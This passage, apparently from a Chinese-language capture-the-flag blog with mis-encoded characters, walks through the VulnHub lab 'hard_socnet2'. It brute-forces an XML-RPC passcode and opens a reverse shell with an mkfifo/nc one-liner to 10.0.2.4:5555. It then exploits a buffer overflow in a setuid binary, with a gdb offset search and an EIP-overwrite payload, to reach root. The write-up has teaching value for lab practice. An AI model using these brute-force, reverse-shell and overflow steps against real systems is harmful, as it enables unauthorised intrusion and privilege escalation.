-mâ€)</p><p>#æŸ¥çœ‹æ“ä½œç³»ç»Ÿå†…å­˜å¤§å°ä½¿ç”¨æƒ…å†µ</p><p>def disk():<br>    return runcmd(â€œdf -hâ€)</p><p>#æŸ¥çœ‹å½“å‰ç³»ç»Ÿç£ç›˜å­˜å‚¨</p><p>def net():<br>    return runcmd(â€œip aâ€)</p><p>#æŸ¥çœ‹å½“å‰ç½‘ç»œé…ç½®ä¿¡æ¯</p><p>def secure_cmd(cmd,passcode):<br>    if passcode&#x3D;&#x3D;debugging_pass:<br>         return runcmd(cmd)<br>    else:<br>        return â€œWrong passcode.â€</p><p>#<strong>åˆ¤æ–­æ ¡éªŒpasscodeå˜é‡ è‹¥ç›¸åŒåˆ™å¯æ‰§è¡Œå‘½ä»¤</strong></p><p>server &#x3D; SimpleXMLRPCServer.SimpleXMLRPCServer((â€œ0.0.0.0â€, 8000))    #è”æƒ³åˆ°8000ç«¯å£é¡µé¢çš„è¯·æ±‚æŠ¥é”™ä¿¡æ¯<br>server.register_function(cpu)<br>server.register_function(mem)<br>server.register_function(disk)<br>server.register_function(net)<br>server.register_function(secure_cmd)</p><p>server.serve_forever()</p></blockquote><p>æœç´¢äº†è§£ä¸€ä¸‹XML-RPC</p><p>ï¼ˆ<a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html%EF%BC%89">https://docs.python.org/zh-cn/3/library/xmlrpc.htmlï¼‰</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124094504425.png" alt="image-20211124094504425"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124095619187.png" alt="image-20211124095619187"></p><p>ç»“åˆmonitor.pyå’Œç¤ºä¾‹å®¢æˆ·ç«¯ä»£ç ï¼Œè¿›è¡Œè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124111612734.png" alt="image-20211124111612734"></p><blockquote><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy(â€œ<a href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:<br>       print(str(proxy.cpu()))</p></blockquote><p>æ‰§è¡Œæµ‹è¯•æ˜¯å¦å¯è¡Œ(åœ¨shellé‡Œä¸å¥½ç¼–è¾‘ï¼Œå¯ç”¨èšå‰‘ä¸Šä¼ )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 a.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124105602436.png" alt="image-20211124105602436"></p><p>æˆåŠŸæ‰“å°å‡ºcpuä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi b.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124112829598.png" alt="image-20211124112829598"></p><blockquote><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy(â€œ<a href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:</p><p>â€‹for p in range(1000,10000):</p><pre><code>  r = str(proxy.secure_cmd(&#39;whoami&#39;,p))</code></pre><p>â€‹if not â€œWrongâ€ in r:</p><p>â€‹print(p)</p><p>â€‹print(r)</p><p>â€‹break</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 b.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124112719226.png" alt="image-20211124112719226"></p><p>æ‰§è¡ŒæˆåŠŸï¼Œpasscodeä¸º1447</p><p>kaliç«¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141525887.png" alt="image-20211124141525887"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi c.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141640107.png" alt="image-20211124141640107"></p><blockquote><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy(â€œ<a href="http://10.0.2.12:8000/&quot;">http://10.0.2.12:8000/&quot;</a>) as proxy:<br>   cmd &#x3D; â€œrm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 10.0.2.4 5555 &gt;&#x2F;tmp&#x2F;fâ€<br>   r &#x3D; str(proxy.secure_cmd(cmd,1447))<br>   print(r)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 c.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124141913344.png" alt="image-20211124141913344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;           #ä¼˜åŒ–shell</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124142428803.png" alt="image-20211124142428803"></p><p>æŸ¥çœ‹socnetç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124142732587.png" alt="image-20211124142732587"></p><h3 id="äºŒæ¬¡ææƒ"><a href="#äºŒæ¬¡ææƒ" class="headerlink" title="äºŒæ¬¡ææƒ"></a>äºŒæ¬¡ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file add_record</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124143037766.png" alt="image-20211124143037766"></p><p>å‘ç°è¯¥æ–‡ä»¶å¯æ‰§è¡Œä¸”å…¶å±ä¸»è´¦å·ä¸ºroot</p><p>å†çœ‹ç›®å½•ä¸‹çš„pedaæ–‡ä»¶</p><p>pedaæ˜¯åŸºäºpythonçš„åŠ¨æ€è°ƒè¯•è„šæœ¬</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145232452.png" alt="image-20211124145232452"></p><p>æ‰§è¡Œadd_recordç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./add_record</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145559990.png" alt="image-20211124145559990"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145716660.png" alt="image-20211124145716660"></p><p>ç®€å•æµ‹è¯•äº†ä¸‹è¯¥ç¨‹åºçš„å„ä¸ªåŠŸèƒ½</p><p>åŒæ—¶ä¹Ÿå‘ç°å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†ç±»ä¼¼äºæ—¥å¿—æ–‡ä»¶ æŸ¥çœ‹å®ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat employee_records.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145917807.png" alt="image-20211124145917807"></p><p>é’ˆå¯¹æ¯ä¸€ä¸ªå¯ä»¥æäº¤æ•°æ®çš„ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•æ˜¯å¦å­˜åœ¨å†…å­˜æº¢å‡ºç­‰é—®é¢˜</p><p>ä½¿ç”¨gdbï¼ˆèƒ½å¤Ÿå¯¹ç¨‹åºè¿è¡Œä¸­å¯„å­˜å™¨ã€å †æ ˆã€å†…å­˜ã€å‡½æ•°è°ƒç”¨ã€æ•°æ®å˜åŒ–ç­‰ä½¿ç”¨æƒ…å†µè¿›è¡Œè¯¦ç»†çš„è·Ÿè¸ªã€åˆ¤æ–­)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151021962.png" alt="image-20211124151021962"></p><p>ç”Ÿæˆ500ä¸ªAå¹¶å¤åˆ¶ç²˜è´´æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*500)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151203410.png" alt="image-20211124151203410"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151247420.png" alt="image-20211124151247420"></p><p>ç¨‹åºæ­£å¸¸é€€å‡ºäº† æ²¡æœ‰äº§ç”Ÿå¼‚å¸¸æº¢å‡ºæƒ…å†µ</p><p>å¯¹å‰©ä¸‹çš„è¾“å…¥ç‚¹è¿›è¡Œæµ‹è¯•</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151456339.png" alt="image-20211124151456339"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151545051.png" alt="image-20211124151545051"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124151631593.png" alt="image-20211124151631593"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124152138188.png" alt="image-20211124152138188"></p><p>åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œåœ¨æœ€åå‘ç°explainå˜é‡æ²¡æœ‰å¯¹å†…å­˜åšè‰¯å¥½çš„é™åˆ¶å¯¼è‡´æº¢å‡ºï¼Œè¿™é‡Œé‡ç‚¹å…³æ³¨å¯„å­˜å™¨EIPï¼ˆEIP å¯„å­˜å™¨é‡Œå­˜å‚¨çš„æ˜¯<strong>CPUä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€</strong>ã€‚ï¼‰å·²ç»è¢«å¡«æ»¡ï¼Œé‚£å°±éœ€è¦ç²¾ç¡®çš„çŸ¥é“å¯„å­˜å™¨EIPä¸­çš„å››ä¸ªAçš„ä½ç½®ï¼Œè‹¥æ˜¯çŸ¥é“å°±å¯ä»¥å°è¯•åœ¨æ­¤ä½ç½®æ‰§è¡Œpayload</p><p>ç»è¿‡å¯¹æ•°é‡è¿›è¡Œæµ‹è¯• ï¼š</p><p>å‘ç°300ä¸ªã€200ä¸ªã€100ä¸ªéƒ½ä¼šé€ æˆæº¢å‡ºï¼Œä½†50ä¸ªä¸ä¼šï¼Œå·²ç»ç¼©å°äº†èŒƒå›´ã€‚</p><p>æ¥ä¸‹æ¥ç”Ÿæˆä¸€æ®µç‰¹å¾å­—ç¬¦(è¿ç»­çš„æ¯å››ä¸ªå­—ç¬¦éƒ½ä¸ç›¸åŒ)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153203054.png" alt="image-20211124153203054"></p><p>å†å°†å…¶è¾“å…¥è‡³explainä½¿å…¶æº¢å‡º</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153409310.png" alt="image-20211124153409310"></p><p>å¯ä»¥ç›´è§‚çš„çœ‹åˆ°å¯„å­˜å™¨EIPä½ç½®å†…çš„æ•°æ®ä¸ºAHAA</p><blockquote><p>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2A<strong>AHAA</strong>dAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern search</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124153749453.png" alt="image-20211124153749453"></p><p>å¾—åˆ°å¯„å­˜å™¨EIPçš„åç§»é‡ä½ç½®ä¸º62ï¼Œå³ä»ç¬¬63ä¸ªå­—ç¬¦å¼€å§‹å°±ä¼šè¿›å…¥å¯„å­˜å™¨EIPä¸­</p><p>ç”Ÿæˆ62ä¸ªAç”¨æ¥å ä½ å†æ·»åŠ BCDE å†æ¬¡ç”¨æ¥éªŒè¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*62+&#x27;BCDE&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124154441052.png" alt="image-20211124154441052"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124154528961.png" alt="image-20211124154528961"></p><p>åˆ°æ­¤å¯ä»¥ç¡®å®šï¼Œå·²ç»å¯ä»¥ç²¾å‡†çš„å‘å¯„å­˜å™¨EIPå†…å†™å…¥</p><p>è¡¥å……ï¼šåœ¨CPUå†…å­˜å‚¨æ•°æ®æ—¶æ˜¯å€’åºå­˜å‚¨çš„    ASCIIç ï¼š42â€“B 43â€“C 44â€“D 45â€“E</p><p>æŸ¥çœ‹æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162244701.png" alt="image-20211124162244701"></p><p>è°ƒç”¨äº†fopenå¯èƒ½æ˜¯ç”¨äºæ‰“å¼€æ–‡ä»¶çš„ putè¾“å‡ºå†…å®¹ printæ˜¾ç¤º</p><p>åœ¨è°ƒç”¨putå‡½æ•°ä¹‹å‰çš„åœ°å€0x0804873dè®¾ç½®æ–­ç‚¹ï¼Œè¿›ä¸€æ­¥è§‚å¯Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break * 0x0804873drd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162444002.png" alt="image-20211124162444002"></p><p>æ·»åŠ æ–­ç‚¹åè¿è¡Œç¨‹åºå¯ä»¥å‘ç°æå‰è§¦åŠäº†æ–­ç‚¹</p><p>å•æ­¥æ‰§è¡Œï¼ˆæ¯æ¬¡åªæ‰§è¡Œä¸€ä¸ªcpuæŒ‡ä»¤ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124162836920.png" alt="image-20211124162836920"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‰§è¡Œäº†ç¨‹åºçš„æ¬¢è¿è¯­ï¼Œ</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124163004119.png" alt="image-20211124163004119"></p><p>é‚£ä¹ˆå°±å¯ä»¥ç¡®å®šåœ¨æ­¤å¼€å§‹ç¨‹åºçš„ç¬¬ä¸€æ­¥</p><p>åŒä¸ªå¢åŠ æ–­ç‚¹å•æ­¥è¿è¡Œé€ä¸ªå°è¯•å…¶ä»–è°ƒç”¨åŠŸèƒ½ï¼Œå°†å…¶å¯¹åº”èµ·æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ del 1  #åˆ é™¤æ–­ç‚¹</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾ä¸€ä¸ªè°ƒç”¨printfçš„ä½ç½®åœ¨å…¶ä¹‹å‰è®¾ç½®æ–­ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break * 0x0804877b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124163823804.png" alt="image-20211124163823804"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124164219850.png" alt="image-20211124164219850"></p><p>ç»è¿‡é€ä¸ªçš„å°è¯• å¯¹è¯¥ç¨‹åºçš„ç¨‹åºé€»è¾‘æœ‰äº†æ›´å…·ä½“çš„äº†è§£</p><p>å§“åï¼š 0x08048750 &lt;+120&gt;:   call   0x8048480 &lt; printf@plt &gt;           </p><p>å·¥ä½œå¹´é™ï¼š0x0804877c &lt;+164&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>å·¥èµ„ï¼š0x080487a4 &lt;+204&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>æ˜¯å¦æœ‰é—®é¢˜ï¼š0x080487cc &lt;+244&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>è‹¥æœ‰ä¸º1 é—®é¢˜è§£é‡Šï¼š0x08048810 &lt;+312&gt;:   call   0x8048480 &lt; printf@plt &gt;</p><p>åœ¨æŸ¥çœ‹çš„è¿‡ç¨‹ä¸­å‘ç°ä¸€åˆ™è°ƒç”¨</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124165222750.png" alt="image-20211124165222750"></p><p>åœ¨0x08048834ä½ç½®è°ƒç”¨äº†vuln é¦–å…ˆè¿™ä¸æ˜¯ä¸€ä¸ªç†ŸçŸ¥çš„å‡½æ•° å…¶æ¬¡å‡½æ•°ååæ²¡æœ‰@pltæ ‡è¯† åˆé¡¾åæ€ä¹‰éš¾å…è”æƒ³åˆ°è„†å¼±ç‚¹ç­‰ çŒœæµ‹è¿™æ˜¯è½¯ä»¶å¼€å‘è€…è‡ªå·±å†™çš„å‡½æ•°</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124165344555.png" alt="image-20211124165344555"></p><p>æŸ¥çœ‹å½“å‰ç¨‹åºä¸­å†…åµŒçš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info func</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124170306580.png" alt="image-20211124170306580"></p><p>å‘ç°setuidå‡½æ•°ï¼Œç»“åˆä¹‹å‰ls -læŸ¥çœ‹add_recordæ–‡ä»¶çš„æƒé™å’Œæ‰€å±è€…æ˜¯rootçš„ä¿¡æ¯ï¼ŒçŒœæµ‹ä½¿ç”¨è¿™ä¸ªå‡½æ•°è°ƒç”¨ç³»ç»Ÿæƒé™  çœ‹åˆ°çš„systemå‡½æ•°æ˜¯å¦å¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»ŸæŒ‡ä»¤å‘¢ï¼Ÿ backdoor â€œåé—¨â€ï¼Ÿå­˜åœ¨ä¸€ç³»åˆ—ç–‘é—®ï¼Œä¹Ÿæ¸æ¸æœ‰äº†æ–¹å‘</p><p>åˆ†åˆ«æŸ¥çœ‹è¿™ä¸ªå‡ ä¸ªå‡½æ•°åœ¨ç¨‹åºä¸­æœ‰ä»€ä¹ˆåŠ¨ä½œï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas vuln</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124170831901.png" alt="image-20211124170831901"></p><p>å¯¹strcpyå‡½æ•°è¿›è¡Œæœç´¢ï¼Œè¯¥å‡½æ•°æ›¾å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124171130950.png" alt="image-20211124171130950"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas backdoor</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124171814589.png" alt="image-20211124171814589"></p><p>è°ƒç”¨äº†setuidå‡½æ•°ææƒï¼Œè°ƒç”¨äº†systemå‡½æ•°æ‰§è¡ŒæŒ‡ä»¤ï¼Œ</p><p>æ€è€ƒï¼šæˆ‘ä»¬éœ€è¦å¯¹systemå‡½æ•°è¿›è¡Œè·Ÿè¸ªï¼Œåˆ™éœ€è¦è®°å½•ä¸‹èµ·å§‹çš„å†…å­˜åœ°å€ï¼ˆ0x08048676ï¼‰ï¼Œé€šè¿‡ç¨‹åºçš„æ­£å¸¸æ‰§è¡Œï¼Œé€šè¿‡explainå˜é‡æ³¨å…¥çš„æ•°æ®ï¼Œåœ¨62ä¸ªå­—èŠ‚ä¹‹åï¼Œå¦‚æœèƒ½æŠŠè¯¥åœ°å€å†™å…¥EIPå¯„å­˜å™¨ä¸­ï¼ŒEIPå¯„å­˜å™¨å°±ä¼šè¯»å–è¯¥åœ°å€ä¸‹çš„æ‰€æœ‰æŒ‡ä»¤ï¼Œå¹¶åˆ†åˆ«æ‰§è¡Œsetuidã€systemæŒ‡ä»¤ï¼Œç´§æ¥ç€å¯ä»¥é€šè¿‡è®¾ç½®æ–­ç‚¹ï¼Œå•æ­¥è·Ÿè¿›åˆ°systemæŒ‡ä»¤ï¼ŒæŸ¥çœ‹å…¶æ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤ï¼Œæ˜¯å¦æœ‰å¯åˆ©ç”¨çš„ç‚¹ï¼Ÿæ¥å®ç°ææƒçš„ç›®æ ‡ã€‚</p><p>æ€è·¯ï¼š</p><p>ä¸»ç¨‹åºä¼šè°ƒç”¨æ‰§è¡Œvulnå‡½æ•°â€“&gt;vulnå‡½æ•°åˆè°ƒç”¨äº†å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„å†…åµŒå‡½æ•°strcpyâ€“&gt;ä½†ä¸»ç¨‹åºå†…å¹¶æœªè°ƒç”¨backdoorå‡½æ•°â€“&gt;æ‰€ä»¥åˆ©ç”¨ä¸»ç¨‹åºå†…åŠ è½½çš„vulnå‡½æ•°ä¸­çš„strcpyå‡½æ•°çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´â€“&gt;å‘EIPå¯„å­˜å™¨å†…å†™å…¥backdoorçš„èµ·å§‹å†…å­˜åŠ è½½åœ°å€â€“&gt;ä»¥æ‰§è¡Œbackdoorå‡½æ•°â€“&gt;æ‰§è¡Œsetuidå‡½æ•°ã€æ‰§è¡Œsystemå‡½æ•°â€“&gt;æ‰§è¡Œsystemå‡½æ•°ä¸­çš„æ“ä½œç³»ç»ŸæŒ‡ä»¤â€“&gt;æœ‰æ²¡æœ‰å¯èƒ½æ³¨å…¥payloadâ€“&gt;å®Œæˆæœ¬åœ°ææƒï¼Ÿ</p><p>å‘EIPå¯„å­˜å™¨å†…å†™å…¥backdoorçš„èµ·å§‹å†…å­˜åŠ è½½åœ°å€ï¼ˆå®šå‘åˆ°payloadå†…ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct; print(&#x27;zz\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124174848606.png" alt="image-20211124174848606"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q     #é€€å‡ºè°ƒè¯•å™¨</span><br></pre></td></tr></table></figure><p>å›åˆ°ç›®æ ‡é¶æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ã€‚r b r</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124175728595.png" alt="image-20211124175728595"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record    #é‡æ–°æ‰“å¼€gdbè°ƒè¯•</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124175923850.png" alt="image-20211124175923850"></p><p>ç»“æœè€äººå¯»å‘³ï¼šäº§ç”Ÿäº†ä¸¤ä¸ªæ–°çš„è¿›ç¨‹ï¼Œ4312æ‰§è¡Œäº†ç¨‹åº&#x2F;bin&#x2F;dash ï¼Œ4313æ‰§è¡Œäº†ç¨‹åº&#x2F;bin&#x2F;bash</p><p>ä¸ºä»€ä¹ˆäº§ç”Ÿè¿™æ ·çš„ç»“æœ?å»åˆ†æä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q     #é€€å‡ºè°ƒè¯•å™¨</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record    #é‡æ–°æ‰“å¼€gdbè°ƒè¯•</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br></pre></td></tr></table></figure><p>å°è¯•åœ¨è°ƒç”¨vulnå‰å¢åŠ æ–­ç‚¹å•æ­¥åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break vuln</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; payload</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124181204165.png" alt="image-20211124181204165"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s       #è¿›è¡Œå•æ­¥æ‰§è¡Œ         </span><br></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œå¤šæ¬¡å•æ­¥æ‰§è¡Œè°ƒè¯•å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124192251868.png" alt="image-20211124192251868"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;é¶æœºåœ°å€:&lt;/strong&gt; &lt;a href=&quot;https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova&quot;&gt;https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;éš¾åº¦ç­‰çº§: é«˜&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ‰“é¶ç›®æ ‡:&lt;/strong&gt; å–å¾— root æƒé™&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å‚è€ƒé“¾æ¥:&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.python.org/zh-cn/3/library/xmlrpc.html&quot;&gt;https://docs.python.org/zh-cn/3/library/xmlrpc.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
